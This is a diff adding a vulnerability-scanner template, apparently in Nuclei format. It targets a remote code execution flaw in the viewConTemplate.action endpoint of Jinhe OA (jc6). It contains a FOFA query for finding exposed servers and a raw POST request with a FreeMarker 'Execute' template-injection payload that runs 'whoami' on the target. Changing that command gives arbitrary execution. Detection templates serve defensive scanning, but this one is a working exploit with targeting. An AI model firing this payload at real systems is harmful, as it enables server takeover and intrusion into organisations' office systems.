@@ -1,0 +1,27 @@
+id: jinheoa-rce
+
+info:
+  name: "金和OA viewConTemplate.action 接口远程代码执行"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"|| body="JHSoft.Web.AddMenu"|| body="/jc6/platform/"
+    金和OA协同办公管理系统（jc6版本）的viewConTemplate.action接口存在远程代码执行安全缺陷。攻击者可通过该接口触发远程代码执行，从而在目标服务器上执行任意命令，可能导致系统权限被完全控制。该系统定位为企事业单位标准化办公解决方案，具备通用化、智能化的产品特性。
+  tags: 金和OA
+
+http:
+- raw:
+  - |
+    POST /jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    moduId=1&code=<clob>${"freemarker.template.utility.Execute"?new()("whoami")}</clob>&uuid=1
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'clob'
